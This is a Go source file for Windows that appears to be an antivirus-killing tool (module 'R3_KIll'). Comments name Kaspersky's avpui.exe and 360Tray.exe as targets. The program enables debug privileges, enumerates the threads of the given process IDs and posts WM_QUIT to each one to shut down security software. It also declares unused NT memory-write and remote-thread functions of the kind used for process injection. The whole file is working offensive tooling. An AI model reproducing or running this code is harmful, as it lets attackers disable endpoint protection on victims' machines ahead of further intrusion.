package main

import (
	"R3_KIll/Init"
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"strconv"
	"sync"
	"time"
	"unsafe"
)

var(
	Kernel32 =windows.NewLazyDLL("Kernel32.dll")
	User32 =windows.NewLazyDLL("User32.dll")
	ntdll =windows.NewLazyDLL("ntdll.dll")


	CreateToolhelp32Snapshot = Kernel32.NewProc("CreateToolhelp32Snapshot")
	Thread32First=Kernel32.NewProc("Thread32First")
	Thread32Next =Kernel32.NewProc("Thread32Next")
	CloseHandle=Kernel32.NewProc("CloseHandle")
	PostThreadMessageA=User32.NewProc("PostThreadMessageA")

	NtOpenProcess =ntdll.NewProc("NtOpenProcess")

	//卡巴斯基 avpui.exe
	//360	360Tray.exe
	//inProcessName            = "360Tray.exe"
	p23n            		 = Kernel32.NewProc("Process32Next")
	CH              		 = Kernel32.NewProc("CloseHandle")
	Ops              		 = Kernel32.NewProc("OpenProcess")
	Ct32s 		 			 = Kernel32.NewProc("CreateToolhelp32Snapshot")
	Nd						 = windows.NewLazySystemDLL("ntdll.dll")
	NtE        = Nd.NewProc("NtCreateThreadEx")
	Nwvm    = Nd.NewProc("NtWriteVirtualMemory")
	Nvm = Nd.NewProc("NtAllocateVirtualMemory")
	baseAddress   uintptr  // 基地址

	sI windows.StartupInfo
	pI windows.ProcessInformation


)

const (
	requestRights = windows.PROCESS_CREATE_THREAD |
		windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_VM_OPERATION |
		windows.PROCESS_VM_WRITE |
		windows.PROCESS_VM_READ |
		windows.PROCESS_TERMINATE |
		windows.PROCESS_DUP_HANDLE |
		0x001

	SectionRWX = SectionWrite |
		SectionRead |
		SectionExecute

	SectionExecute = 0x8
	SectionRead = 0x4
	SecCommit = 0x08000000
	SectionWrite = 0x2
	WM_QUIT =0x12
	WM_DESTROY =                     0x0002
	WM_CLOSE =                     0x0010
	WM_QUERYENDSESSION =0x0011
	WM_ENDSESSION =                  0x0016
	WM_COMPACTING =                  0x0041
)
type ulong int32
type ulong_ptr uintptr

type THREADENTRY32 struct{
	dwSize	ulong
	cntUsage ulong
	th32ThreadID ulong
	th32OwnerProcessID ulong
	tpBasePri  ulong
	tpDeltaPri  ulong
	dwFlags ulong
}

type PROCESSENTRY32 struct {
	dwSize              ulong
	cntUsage            ulong
	th32ProcessID       ulong
	th32DefaultHeapID   ulong_ptr
	th32ModuleID        ulong
	cntThreads          ulong
	th32ParentProcessID ulong
	pcPriClassBase      ulong
	dwFlags             ulong
	szExeFile           [260]byte

}



//获取线程ID
func ThreadID(pid []int)[]int{
	var v4 []int
	for i,_ := range pid{
		var v2 uintptr

		//获取快照句柄
		hSnapshot,_,_:=CreateToolhelp32Snapshot.Call(uintptr(4),uintptr(0))

		var v3 THREADENTRY32
		v3.dwSize=28
		v2 ,_,_=Thread32First.Call(hSnapshot,uintptr(unsafe.Pointer(&v3)))


		for v2!=0{
			if int(v3.th32OwnerProcessID) == pid[i]{
				v4 = append(v4,int(v3.th32ThreadID))
			}
			v2,_,_ = Thread32Next.Call(hSnapshot,uintptr(unsafe.Pointer(&v3)))

		}
		_,_,_=CloseHandle.Call(hSnapshot)
	}

	return v4

}


/*

//获取进程PID
func Gp() int {
	pHandle, _, _ := Ct32s.Call(uintptr(0x2), uintptr(0x0))
	tasklist := make(map[string]int)
	var PID int
	if int(pHandle) == -1 {
		os.Exit(1)
	}

	for {
		var proc PROCESSENTRY32
		proc.dwSize = ulong(unsafe.Sizeof(proc))
		if rt, _, _ := p23n.Call(pHandle, uintptr(unsafe.Pointer(&proc))); int(rt) == 1 {
			ProcessName := string(proc.szExeFile[0:])

			//th32ModuleID := strconv.Itoa(int(proc.th32ModuleID))
			ProcessID := int(proc.th32ProcessID)
			tasklist[ProcessName] = ProcessID
		} else {
			break
		}
	}

	for k, v := range tasklist {
		if strings.Contains(k, inProcessName) == true{
			PID =v

		}
	}
	_, _, _ = CH.Call(pHandle)

	return PID
}

*/


func main(){

	//ID :=flag.Int("PID",0,"-PID 输入进程ID")
	//flag.Parse()
	var ID *[]int
	var tmp []int
	wg := new(sync.WaitGroup)
	wg.Add(5)
	go func(){
		defer wg.Done()
		if len(os.Args) >= 2{
			for j:= 0 ;j < len(os.Args);j++{
				tmp0,_ := strconv.Atoi(os.Args[j])
				tmp0++
				tmp = append(tmp,tmp0)
			}
			ID = &tmp
		}else{
			panic(1)
		}
	}()
	go func(){
		defer wg.Done()
		time.Sleep(2*time.Second)
	}()
	go func(){
		defer wg.Done()
		time.Sleep(2*time.Second)
	}()
	go func(){
		defer wg.Done()
		time.Sleep(2*time.Second)
	}()
	go func(){
		defer wg.Done()
		time.Sleep(2*time.Second)
	}()

	wg.Wait()

	PID :=*ID

	Init.RtlEnableDebug()
	Init.RtlEnableSecurity()
	Init.RtlEnableSystemEnv()

	//GID:=Gp()
	fmt.Println(PID)
	TID:=ThreadID(PID)


	var OK uintptr


	for _,v := range TID{
		fmt.Println(v)
		//WM_DESTROY|WM_CLOSE|WM_QUIT|WM_QUERYENDSESSION|WM_ENDSESSION|WM_COMPACTING
		OK,_,_=PostThreadMessageA.Call(uintptr(v),uintptr(WM_QUIT),uintptr(0),uintptr(0))
		fmt.Println(OK)
		windows.SleepEx(1,false)
	}

/*

	Init.RtlDisableDebug()
	Init.RtlDisableSecurity()
	Init.RtlDisableSystemEnv()

 */


	//Hook.Call(uintptr(PID))

}